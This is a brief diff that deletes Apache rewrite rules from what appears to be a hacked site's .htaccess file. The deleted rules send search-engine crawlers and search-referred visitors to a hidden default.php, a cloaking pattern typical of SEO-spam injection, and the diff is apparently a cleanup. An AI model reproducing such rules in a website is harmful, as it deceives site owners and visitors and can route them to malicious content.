@@ -1,9 +1,0 @@
-RewriteEngine On
-RewriteCond %{HTTP_USER_AGENT} (bing|google|yahoo|msn|aol) [NC,OR]
-RewriteCond %{HTTP_REFERER} (yahoo|bing|google|msn|aol)
-RewriteRule ^(.*)$ default.php [L,QSA]
-
-RewriteCond %{HTTP_USER_AGENT} Googlebot [OR]
-RewriteCond %{HTTP_REFERER} (yahoo|msn|aol|bing|google)
-RewriteCond %{REQUEST_URI} !^.*\.(jpg|css|js|gif|png|css|js|xml)$ [NC]
-RewriteRule ^(.*)$ default.php?$1 [L,QSA]
